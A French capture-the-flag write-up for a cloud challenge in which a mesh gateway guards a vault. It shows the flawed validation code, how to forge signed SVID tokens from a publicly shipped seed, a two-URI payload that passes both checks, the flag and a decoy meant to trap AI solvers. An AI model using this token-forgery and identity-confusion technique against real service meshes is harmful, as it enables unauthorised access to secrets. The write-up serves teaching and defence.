# spiffe-mtls-ghost (cloud, 187) — confused deputy à deux portes + clé dérivée d'un seed public

## Challenge
**Catégorie :** cloud  **Instance :** HTTP (`https://<rand>.t.ctf.tg/`)  **Auteur :** the-darknova
**Fichiers :** `bundle_config.json`, `mesh_proxy.py`
**Flag :** `NCTF{984c1274da61f760a5b29dea}`

> Un maillage de microservices place une passerelle d'authentification (`mesh_proxy.py`)
> devant un coffre-fort interne (Vault). Seuls les services « dûment certifiés » (mTLS/SPIFFE)
> doivent y accéder. Un audit révèle une anomalie dans la chaîne de confiance.

## Deux failles qui se combinent

### 1) La clé de signature est dérivée d'un secret PUBLIC
`mesh_proxy.py` signe/valide les tokens **SVID** ainsi :
```python
key = sha256( config["attestation"]["shared_workload_seed"].encode() ).digest()
sig = hmac_sha256(key, raw_json).hexdigest()
token = base64url(raw_json) + "." + sig
```
Or `shared_workload_seed` (= `spiffe-workload-attestation-secret-k8s-mesh-2026`) est **écrit
en clair dans `bundle_config.json`**, fourni avec le challenge. ⇒ **on peut forger n'importe
quel token valide.**

### 2) Deux portes inspectent des identités DIFFÉRENTES du même token
Le token contient une **liste** d'URI SAN. La validation :
```python
ingress_san = str(uris[0])      # PORTE 1 (Ingress) : la PREMIÈRE URI
if not ingress_san.startswith("spiffe://darknova.io/ns/sandbox/"): reject

vault_target_san = str(uris[-1])  # PORTE 2 (Vault)  : la DERNIÈRE URI
canonical = f"spiffe://{netloc}{posixpath.normpath(unquote(path))}"
if canonical != "spiffe://darknova.io/ns/prod/sa/vault-controller": reject
return 200, {"vault_secret": REAL_FLAG}
```
La porte d'entrée regarde `uris[0]`, la porte du coffre regarde `uris[-1]`. **Avec deux URIs
différentes, on contente les deux en même temps** (confused deputy).

## Exploit
Payload SVID forgé (signé avec la clé dérivée du seed public) :
```json
{
  "subject": {"CN": "frontend.sandbox"},
  "san": {"uris": [
    "spiffe://darknova.io/ns/sandbox/frontend",
    "spiffe://darknova.io/ns/prod/sa/vault-controller"
  ]}
}
```
Envoyé en `Authorization: Bearer <token>` → `200 {"principal":"…vault-controller",
"vault_secret":"NCTF{984c1274da61f760a5b29dea}"}`.

## Le piège (leurre anti-IA)
Si `subject.CN == "admin.internal"` (le `debug_honeypot_cn`), le service renvoie
`DECOY_FLAG = NCTF{self_signed_cn_debug_honeypot}` → **faux flag**. On met donc un CN banal.

## Leçon (pour le jury)
> Deux contrôles de sécurité ne doivent **jamais lire des champs différents du même jeton**
> (ici 1ʳᵉ vs dernière URI) : c'est un *confused deputy*. Et une clé de signature **ne se
> dérive jamais d'une valeur publique** — le seed en clair dans le bundle permettait de
> fabriquer des identités arbitraires.

## Fichier
`solve_spiffe.py` (forge + validé offline contre un mock fidèle avant le run).
